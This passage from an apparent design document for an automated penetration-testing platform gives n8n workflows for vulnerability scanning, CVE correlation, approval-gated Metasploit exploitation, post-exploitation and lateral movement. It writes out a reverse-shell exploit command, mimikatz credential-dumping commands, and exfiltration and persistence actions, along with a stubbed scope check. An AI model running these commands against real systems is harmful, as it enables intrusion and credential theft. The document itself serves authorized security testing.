      "type": "n8n-nodes-base.wait",
      "parameters": {
        "amount": 30,
        "unit": "minutes",
        "resume": "interval"
      }
    },
    {
      "name": "Check Scan Status",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['OpenVAS Config'].json['omp_url']}}/omp",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "xml",
              "value": "=<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<get_tasks task_id=\"{{$node['Start Scan'].json['task_id']}}\"/>"
            }
          ]
        }
      }
    },
    {
      "name": "Is Scan Complete",
      "type": "n8n-nodes-base.if",
      "parameters": {
        "conditions": {
          "string": [
            {
              "value1": "={{$node['Check Scan Status'].json['status']}}",
              "operation": "notEqual",
              "value2": "Done"
            }
          ]
        }
      }
    },
    {
      "name": "Get Report",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['OpenVAS Config'].json['omp_url']}}/omp",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "xml",
              "value": "=<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<get_reports report_id=\"{{$node['Check Scan Status'].json['report_id']}}\" format_id=\"a994b278-1f62-11e1-96ac-406186ea4fc5\"/>"
            }
          ]
        }
      }
    },
    {
      "name": "Parse Results",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const report = $node['Get Report'].json['report'];
          const vulnerabilities = [];
          
          // Parse OpenVAS XML report
          const results = report.results || [];
          
          for (const result of results) {
            vulnerabilities.push({
              source: 'openvas',
              source_id: result.id,
              host: result.host,
              port: result.port,
              severity: parseFloat(result.threat) || 0,
              title: result.name,
              description: result.description,
              solution: result.solution,
              cve_id: result.cves?.[0] || null,
              cvss_base: parseFloat(result.cvss_base) || 0,
              oid: result.nvt?.oid,
              tags: result.nvt?.tags || '',
              references: result.refs || []
            });
          }
          
          return vulnerabilities.map(vuln => ({ json: vuln }));
        "
      }
    },
    {
      "name": "Store Vulnerabilities",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/vulnerabilities/bulk",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "vulnerabilities",
              "value": "={{JSON.stringify($node['Parse Results'].json)}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 7. Workflow 7: CVE Correlation Engine

### 7.1 Correlation Logic
```python
def correlate_cves(engagement_id):
    """
    Correlate discovered services with CVE database
    """
    # Get all services with versions
    services = get_services_with_versions(engagement_id)
    
    # Get CVE database
    cve_db = get_cve_database()
    
    # Correlate
    correlations = []
    
    for service in services:
        product = service.product.lower()
        version = service.version
        
        # Find matching CVEs
        matching_cves = cve_db.filter(
            vendor=service.vendor,
            product=product
        ).within_version_range(version)
        
        for cve in matching_cves:
            correlations.append({
                'service_id': service.id,
                'host_id': service.host_id,
                'cve_id': cve.cve_id,
                'cvss_score': cve.cvss_base_score,
                'severity': cve.cvss_base_severity,
                'exploit_available': cve.exploit_published,
                'description': cve.description,
                'link': f"https://nvd.nist.gov/vuln/detail/{cve.cve_id}",
                'confidence': calculate_correlation_confidence(service, cve)
            })
    
    return correlations
```

### 7.2 Workflow Implementation
```json
{
  "name": "cve-correlation-engine",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/cve-correlation",
        "method": "post"
      }
    },
    {
      "name": "Get Services",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}/services?has_version=true"
      }
    },
    {
      "name": "Query CVE Database",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/cves/search",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "services",
              "value": "={{JSON.stringify($node['Get Services'].json['services'])}}"
            }
          ]
        }
      }
    },
    {
      "name": "Calculate Risk",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const correlations = $node['Query CVE Database'].json['correlations'];
          
          for (const corr of correlations) {
            // Calculate adjusted risk score
            corr.adjusted_score = corr.cvss_score;
            
            // Exploit available increases score
            if (corr.exploit_available) {
              corr.adjusted_score += 1.0;
            }
            
            // Internet-facing increases score
            if (corr.is_exposed) {
              corr.adjusted_score += 0.5;
            }
            
            // Public exploit increases score more
            if (corr.exploit_status === 'functional') {
              corr.adjusted_score += 2.0;
            }
            
            // Cap at 10.0
            corr.adjusted_score = Math.min(corr.adjusted_score, 10.0);
          }
          
          return correlations.map(c => ({ json: c }));
        "
      }
    },
    {
      "name": "Create Correlations",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/vulnerabilities/correlation",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "correlations",
              "value": "={{JSON.stringify($node['Calculate Risk'].json)}}"
            }
          ]
        }
      }
    },
    {
      "name": "Update Vulnerability Database",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "put",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/vulnerabilities",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "source",
              "value": "'correlation'"
            }
          ]
        }
      }
    },
    {
      "name": "Generate Exploitation Candidates",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const vulnerabilities = $node['Create Correlations'].json['vulnerabilities'];
          
          const candidates = vulnerabilities
            .filter(v => v.adjusted_score >= 7.0 || v.exploit_available)
            .sort((a, b) => b.adjusted_score - a.adjusted_score)
            .map(v => ({
              vulnerability_id: v.id,
              host_id: v.host_id,
              cve_id: v.cve_id,
              cvss_score: v.adjusted_score,
              exploit_available: v.exploit_available,
              recommendation: getExploitRecommendation(v)
            }));
          
          return candidates.map(c => ({ json: c }));
        "
      }
    },
    {
      "name": "Notify Analyst",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/notifications",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "type",
              "value": "'high_risk_cve'"
            },
            {
              "name": "message",
              "value": "='Found ' + $node['Generate Exploitation Candidates'].json.length + ' high-risk CVEs requiring review'"
            },
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 8. Workflow 8: Exploitation Approval Workflow

### 8.1 Workflow Diagram
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    Workflow 8: Exploitation Approval Workflow                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐          │
│  │ Vulnerability│────>│ Assess   │────>│ Create   │────>│ Request  │          │
│  │ Detected │     │ Risk     │     │ Approval │     │ Approval │          │
│  └──────────┘     └──────────┘     └──────────┘     └────┬─────┘          │
│                                                          │                  │
│                              ┌────────────────────────────┘                  │
│                              │                                               │
│                              ▼                                               │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐          │
│  │  Pending │     │   Send   │     │  Escalate│     │ Update  │          │
│  │ Approval │────>│ Reminder │────>│ (Timeout)│     │ Status  │          │
│  └──────────┘     └──────────┘     └──────────┘     └──────────┘          │
│       │                                                          │          │
│       │  ┌──────────────────────────────────────────────────────┘          │
│       │  │                                                               │
│       ▼  ▼                                                               │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐          │
│  │  User    │────>│ Validate │────>│ Create   │────>│ Notify  │          │
│  │ Approves │     │ Approval │     │ Session  │     │ Executor │          │
│  └──────────┘     └──────────┘     └──────────┘     └──────────┘          │
│                                                                              │
│       │                    ┌──────────┐                                     │
│       │              ┌────>│  User    │────┐                                 │
│       │              │     │ Rejects │    │                                 │
│       ▼              │     └──────────┘    │                                 │
│  ┌──────────┐        │                    ▼                                 │
│  │ Execute  │        │              ┌──────────┐                             │
│  │ Exploit  │        │              │ Reject   │                             │
│  └──────────┘        │              │ Request  │                             │
│       │              │              └──────────┘                             │
│       ▼              │                    │                                  │
│  ┌──────────┐        │                    │                                  │
│  │ Log      │<───────┴────────────────────┘                                  │
│  │ Result   │                                                           │
│  └──────────┘                                                           │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 8.2 Workflow Implementation
```json
{
  "name": "exploitation-approval",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/exploitation-request",
        "method": "post"
      }
    },
    {
      "name": "Assess Risk",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const request = items[0].json;
          const vulnerability = request.vulnerability;
          
          // Calculate risk level
          let riskLevel = 'low';
          const cvssScore = vulnerability.cvss_base_score || 0;
          
          if (cvssScore >= 9.0) {
            riskLevel = 'critical';
          } else if (cvssScore >= 7.0) {
            riskLevel = 'high';
          } else if (cvssScore >= 4.0) {
            riskLevel = 'medium';
          }
          
          // Check for additional risk factors
          const riskFactors = [];
          
          if (vulnerability.exploit_available) {
            riskFactors.push('Exploit code available');
          }
          
          if (vulnerability.is_critical_system) {
            riskFactors.push('Critical system');
          }
          
          if (vulnerability.requires_privileges === 'none') {
            riskFactors.push('No privileges required');
          }
          
          // Determine approval requirements
          let requiredApprovers = 1;
          let requiredRoles = ['SENIOR_ANALYST'];
          
          if (riskLevel === 'critical') {
            requiredApprovers = 2;
            requiredRoles = ['TEAM_LEAD', 'CISO'];
          } else if (riskLevel === 'high') {
            requiredRoles.push('TEAM_LEAD');
          }
          
          return [{
            json: {
              ...request,
              risk_level: riskLevel,
              risk_factors: riskFactors,
              required_approvers: requiredApprovers,
              required_roles: requiredRoles,
              expires_in_hours: riskLevel === 'critical' ? 4 : 24
            }
          }];
        "
      }
    },
    {
      "name": "Create Approval Request",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "approval_type",
              "value": "'exploitation'"
            },
            {
              "name": "title",
              "value": "'Exploitation approval for CVE ' + $node['Trigger'].json['vulnerability']['cve_id']"
            },
            {
              "name": "risk_level",
              "value": "={{$node['Assess Risk'].json['risk_level']}}"
            },
            {
              "name": "required_approvers",
              "value": "={{$node['Assess Risk'].json['required_approvers']}}"
            },
            {
              "name": "required_roles",
              "value": "={{JSON.stringify($node['Assess Risk'].json['required_roles'])}}"
            },
            {
              "name": "expires_at",
              "value": "={{new Date(Date.now() + $node['Assess Risk'].json['expires_in_hours'] * 3600000).toISOString()}}"
            }
          ]
        }
      }
    },
    {
      "name": "Send Notification",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/notifications",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "type",
              "value": "'exploitation_approval_required'"
            },
            {
              "name": "priority",
              "value": "={{$node['Assess Risk'].json['risk_level']}}"
            },
            {
              "name": "message",
              "value": "'Exploitation approval required for ' + $node['Trigger'].json['vulnerability']['title']"
            },
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "approval_id",
              "value": "={{$node['Create Approval Request'].json['id']}}"
            }
          ]
        }
      }
    },
    {
      "name": "Wait for Approval",
      "type": "n8n-nodes-base.wait",
      "parameters": {
        "amount": 4,
        "unit": "hours",
        "resume": "interval"
      }
    },
    {
      "name": "Check Approval Status",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals/{{$node['Create Approval Request'].json['id']}}"
      }
    },
    {
      "name": "Is Approved",
      "type": "n8n-nodes-base.if",
      "parameters": {
        "conditions": {
          "string": [
            {
              "value1": "={{$node['Check Approval Status'].json['status']}}",
              "operation": "equal",
              "value2": "approved"
            }
          ]
        }
      }
    },
    {
      "name": "Escalate",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals/{{$node['Create Approval Request'].json['id']}}/escalate",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "reason",
              "value": "'Approval request expired'"
            }
          ]
        }
      },
      "condition": "={{$node['Check Approval Status'].json['status'] === 'pending'}}"
    },
    {
      "name": "Trigger Exploitation",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/webhooks/exploitation-execute",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "vulnerability_id",
              "value": "={{$node['Trigger'].json['vulnerability']['id']}}"
            },
            {
              "name": "approval_id",
              "value": "={{$node['Create Approval Request'].json['id']}}"
            },
            {
              "name": "exploit_module",
              "value": "={{$node['Trigger'].json['exploit_module']}}"
            }
          ]
        }
      },
      "condition": "={{$node['Is Approved'].json['value'] === true}}"
    },
    {
      "name": "Reject Request",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "put",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals/{{$node['Create Approval Request'].json['id']}}",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "status",
              "value": "'rejected'"
            }
          ]
        }
      },
      "condition": "={{$node['Is Approved'].json['value'] === false}}"
    },
    {
      "name": "Notify Requester",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/notifications",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "type",
              "value": "'exploitation_rejected'"
            },
            {
              "name": "message",
              "value": "'Your exploitation request has been rejected'"
            },
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            }
          ]
        }
      },
      "condition": "={{$node['Is Approved'].json['value'] === false}}"
    }
  ]
}
```

---

## 9. Workflow 9: Exploitation Execution Workflow

### 9.1 Workflow Implementation
```json
{
  "name": "exploitation-execution",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/exploitation-execute",
        "method": "post"
      }
    },
    {
      "name": "Validate Approval",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals/{{$node['Trigger'].json['approval_id']}}/validate"
      }
    },
    {
      "name": "Check Valid",
      "type": "n8n-nodes-base.if",
      "parameters": {
        "conditions": {
          "boolean": [
            {
              "value1": "={{$node['Validate Approval'].json['valid']}}",
              "operation": "equal"
            }
          ]
        }
      }
    },
    {
      "name": "Log Execution Start",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/exploits",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "vulnerability_id",
              "value": "={{$node['Trigger'].json['vulnerability_id']}}"
            },
            {
              "name": "status",
              "value": "'executing'"
            },
            {
              "name": "executed_by",
              "value": "={{$node['Trigger'].json['approved_by']}}"
            }
          ]
        }
      }
    },
    {
      "name": "Execute Metasploit",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const request = $node['Trigger'].json;
          
          // Build Metasploit command
          const msfCommand = \`msfconsole -q -x '
            use exploit/\${request.exploit_module};
            set RHOST \${request.target_ip};
            set RPORT \${request.target_port};
            set PAYLOAD \${request.payload || 'generic/shell_reverse_tcp'};
            set LHOST \${request.listener_ip};
            set LPORT \${request.listener_port};
            set TargetTimeout \${request.timeout || 30};
            set EnableContextEncoding true;
            set ContextInformationFile /tmp/anptop/context_\${request.engagement_id}.json;
            exploit;
            exit;
          '\`;
          
          return [{
            json: {
              command: msfCommand,
              working_dir: '/tmp/anptop/exploits',
              timeout: request.timeout || 300
            }
          }];
        "
      }
    },
    {
      "name": "Run Exploit",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{$node['Execute Metasploit'].json['command']}}",
        "timeout": "={{$node['Execute Metasploit'].json['timeout']}}",
        "options": {
          "workingDirectory": "={{$node['Execute Metasploit'].json['working_dir']}}"
        }
      }
    },
    {
      "name": "Parse Exploit Output",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const output = $node['Run Exploit'].json['stdout'] || '';
          const error = $node['Run Exploit'].json['stderr'] || '';
          
          // Parse session information
          const sessionMatch = output.match(/meterpreter session (\\d+) opened/i);
          const shellMatch = output.match(/shell (\\d+) obtained/i);
          const errorMatch = output.match(/exploit failed: (.+)/i);
          
          let result = {
            success: false,
            session_id: null,
            session_type: null,
            error_message: null,
            output: output
          };
          
          if (sessionMatch || shellMatch) {
            result.success = true;
            result.session_id = sessionMatch?.[1] || shellMatch?.[1];
            result.session_type = sessionMatch ? 'meterpreter' : 'shell';
          } else if (errorMatch) {
            result.error_message = errorMatch[1];
          } else if (output.includes('Command shell session')) {
            result.success = true;
            result.session_type = 'shell';
          }
          
          return [{
            json: result
          }];
        "
      }
    },
    {
      "name": "Update Exploit Record",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "put",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/exploits/{{$node['Log Execution Start'].json['id']}}",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "status",
              "value": "={{$node['Parse Exploit Output'].json['success'] ? 'completed' : 'failed'}}"
            },
            {
              "name": "success",
              "value": "={{$node['Parse Exploit Output'].json['success']}}"
            },
            {
              "name": "session_id",
              "value": "={{$node['Parse Exploit Output'].json['session_id']}}"
            },
            {
              "name": "session_type",
              "value": "={{$node['Parse Exploit Output'].json['session_type']}}"
            },
            {
              "name": "output",
              "value": "={{$node['Parse Exploit Output'].json['output']}}"
            },
            {
              "name": "error_message",
              "value": "={{$node['Parse Exploit Output'].json['error_message']}}"
            }
          ]
        }
      }
    },
    {
      "name": "Collect Evidence",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/webhooks/evidence-collection",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "exploit_id",
              "value": "={{$node['Log Execution Start'].json['id']}}"
            },
            {
              "name": "host_id",
              "value": "={{$node['Trigger'].json['target_host_id']}}"
            },
            {
              "name": "evidence_types",
              "value": "=['screenshot', 'command_output', 'session_info']"
            }
          ]
        }
      },
      "condition": "={{$node['Parse Exploit Output'].json['success']}}"
    },
    {
      "name": "Notify Success",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/notifications",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "type",
              "value": "'exploitation_success'"
            },
            {
              "name": "priority",
              "value": "'high'"
            },
            {
              "name": "message",
              "value": "'Exploitation successful. Session: ' + $node['Parse Exploit Output'].json['session_id']"
            },
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            }
          ]
        }
      },
      "condition": "={{$node['Parse Exploit Output'].json['success']}}"
    },
    {
      "name": "Notify Failure",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/notifications",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "type",
              "value": "'exploitation_failed'"
            },
            {
              "name": "priority",
              "value": "'medium'"
            },
            {
              "name": "message",
              "value": "'Exploitation failed: ' + $node['Parse Exploit Output'].json['error_message']"
            },
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            }
          ]
        }
      },
      "condition": "={{!$node['Parse Exploit Output'].json['success']}}"
    }
  ]
}
```

---

## 10. Workflow 10: Post-Exploitation Approval & Execution

### 10.1 Post-Exploitation Actions
```yaml
post_exploitation_actions:
  enumeration:
    - system_info
    - user_info
    - network_info
    - processes
    - installed_software
    - scheduled_tasks
    - services
    
  credential_harvesting:
    - lsass_dump
    - registry_hives
    - password_filter
    - browser_credentials
    - wdigest
    - ssp_privileges
    
  data_discovery:
    - file_search
    - database_connections
    - shares_enumeration
    - sensitive_files
    
  persistence:
    - scheduled_task
    - service
    - registry_run
    - wmi_event_subscription
```

### 10.2 Workflow Implementation
```json
{
  "name": "post-exploitation",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/post-exploitation",
        "method": "post"
      }
    },
    {
      "name": "Validate Session",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/sessions/{{$node['Trigger'].json['session_id']}}/validate"
      }
    },
    {
      "name": "Assess Post-Ex Risk",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const request = $node['Trigger'].json;
          const action = request.action_type;
          
          // Risk assessment based on action type
          const actionRisk = {
            'enumeration': { level: 'low', approvers: 1, roles: ['ANALYST'] },
            'credential_harvesting': { level: 'high', approvers: 2, roles: ['SENIOR_ANALYST', 'TEAM_LEAD'] },
            'data_discovery': { level: 'medium', approvers: 1, roles: ['SENIOR_ANALYST'] },
            'persistence_setup': { level: 'critical', approvers: 2, roles: ['TEAM_LEAD', 'CISO'] },
            'privilege_escalation': { level: 'high', approvers: 2, roles: ['SENIOR_ANALYST', 'TEAM_LEAD'] },
            'data_exfiltration': { level: 'critical', approvers: 2, roles: ['TEAM_LEAD', 'CISO'] }
          };
          
          const riskConfig = actionRisk[action] || { level: 'medium', approvers: 1, roles: ['SENIOR_ANALYST'] };
          
          return [{
            json: {
              ...request,
              risk_level: riskConfig.level,
              required_approvers: riskConfig.approvers,
              required_roles: riskConfig.roles,
              approval_timeout_hours: riskConfig.level === 'critical' ? 2 : 8
            }
          }];
        "
      }
    },
    {
      "name": "Request Approval",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "approval_type",
              "value": "'post_exploitation'"
            },
            {
              "name": "request_type",
              "value": "={{$node['Trigger'].json['action_type']}}"
            },
            {
              "name": "title",
              "value": "'Post-exploitation: ' + $node['Trigger'].json['action_name']"
            },
            {
              "name": "risk_level",
              "value": "={{$node['Assess Post-Ex Risk'].json['risk_level']}}"
            },
            {
              "name": "required_approvers",
              "value": "={{$node['Assess Post-Ex Risk'].json['required_approvers']}}"
            },
            {
              "name": "expires_at",
              "value": "={{new Date(Date.now() + $node['Assess Post-Ex Risk'].json['approval_timeout_hours'] * 3600000).toISOString()}}"
            }
          ]
        }
      }
    },
    {
      "name": "Wait for Approval",
      "type": "n8n-nodes-base.wait",
      "parameters": {
        "amount": 2,
        "unit": "hours",
        "resume": "interval"
      }
    },
    {
      "name": "Check Status",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals/{{$node['Request Approval'].json['id']}}"
      }
    },
    {
      "name": "Is Approved",
      "type": "n8n-nodes-base.if",
      "parameters": {
        "conditions": {
          "string": [
            {
              "value1": "={{$node['Check Status'].json['status']}}",
              "operation": "equal",
              "value2": "approved"
            }
          ]
        }
      }
    },
    {
      "name": "Execute Post-Ex",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const request = $node['Trigger'].json;
          
          // Build post-exploitation command based on action type
          const commands = {
            'system_info': 'sysinfo; getuid; hostname',
            'user_info': 'getuid; whoami /all; net user',
            'network_info': 'ipconfig /all; netstat -ano; route print',
            'processes': 'ps; tasklist /v /fo csv',
            'credential_harvesting': 'mimikatz sekurlsa::logonpasswords; lsadump::sam',
            'file_search': 'search -f *.password; search -f *.txt',
            'data_exfiltration': 'download; cat'
          };
          
          const command = commands[request.action_type] || request.custom_command;
          
          return [{
            json: {
              session_id: request.session_id,
              command: command,
              action_type: request.action_type,
              timeout: 120
            }
          }];
        "
      }
    },
    {
      "name": "Run Command",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{'msfconsole -q -x \\'sessions -i ' + $node['Execute Post-Ex'].json['session_id'] + '; ' + $node['Execute Post-Ex'].json['command'] + '\\''}}",
        "timeout": "={{$node['Execute Post-Ex'].json['timeout']}}"
      }
    },
    {
      "name": "Collect Evidence",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/webhooks/evidence-collection",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "post_exploit_id",
              "value": "={{$node['Request Approval'].json['id']}}"
            },
            {
              "name": "output",
              "value": "={{$node['Run Command'].json['output']}}"
            }
          ]
        }
      }
    },
    {
      "name": "Update Record",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/post-exploitation",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "action_type",
              "value": "={{$node['Trigger'].json['action_type']}}"
            },
            {
              "name": "status",
              "value": "'completed'"
            },
            {
              "name": "output",
              "value": "={{$node['Run Command'].json['output']}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 11. Workflow 11: Lateral Movement Approval & Execution

### 11.1 Lateral Movement Techniques
```yaml
lateral_movement_techniques:
  windows:
    - wmiexec: "WMI lateral movement"
    - psexec: "PsExec remote execution"
    - smbexec: "SMBExec implementation"
    - atexec: "Task Scheduler lateral movement"
    - dcomexec: "DCOM lateral movement"
    
  linux:
    - ssh: "SSH pivot"
    - smb: "SMB mounting"
    
  database:
    - powerupsql: "SQL Server pivot"
```

### 11.2 Workflow Implementation
```json
{
  "name": "lateral-movement",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/lateral-movement",
        "method": "post"
      }
    },
    {
      "name": "Validate Target",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const request = $node['Trigger'].json;
          
          // Validate target is in scope
          const validation = {
            target_in_scope: false,
            target_ip: request.target_ip,
            source_ip: request.source_ip,
            technique: request.technique
          };
          
          // Check target against engagement scope
          // This would call the backend API
          
          return [{
            json: {
              ...request,
              ...validation,
              validation_status: validation.target_in_scope ? 'valid' : 'invalid'
            }
          }];
        "
      }
    },
    {
      "name": "Assess Lateral Risk",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const request = $node['Trigger'].json;
          
          // High-risk operation - always requires escalation
          const riskAssessment = {
            risk_level: 'critical',
            required_approvers: 2,
            required_roles: ['TEAM_LEAD', 'CISO'],
            requires_justification: true,
            audit_logging: true,
            approval_timeout_hours: 2
          };
          
          return [{
            json: {
              ...request,
              ...riskAssessment
            }
          }];
        "
      }
    },
    {
      "name": "Request Approval",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "approval_type",
              "value": "'lateral_movement'"
            },
            {
              "name": "title",
              "value": "'Lateral movement: ' + $node['Trigger'].json['technique'] + ' to ' + $node['Trigger'].json['target_ip']"
            },
            {
              "name": "risk_level",
              "value": "'critical'"
            },
            {
              "name": "required_approvers",
              "value": "=2"
            },
            {
              "name": "requires_justification",
              "value": "=true"
            }
          ]
        }
      }
    },
    {
      "name": "Wait for Approval",
      "type": "n8n-nodes-base.wait",
      "parameters": {
        "amount": 2,
        "unit": "hours",
        "resume": "interval"
      }
    },
    {
      "name": "Check Approval",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals/{{$node['Request Approval'].json['id']}}"
      }
    },
    {
      "name": "Is Approved",
      "type": "n8n-nodes-base.if",
      "parameters": {
        "conditions": {
          "string": [
            {
              "value1": "={{$node['Check Approval'].json['status']}}",
              "operation": "equal",
              "value2": "approved"
            }
          ]
        }
      }
    },
    {
      "name": "Execute Lateral",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const request = $node['Trigger'].json;
          
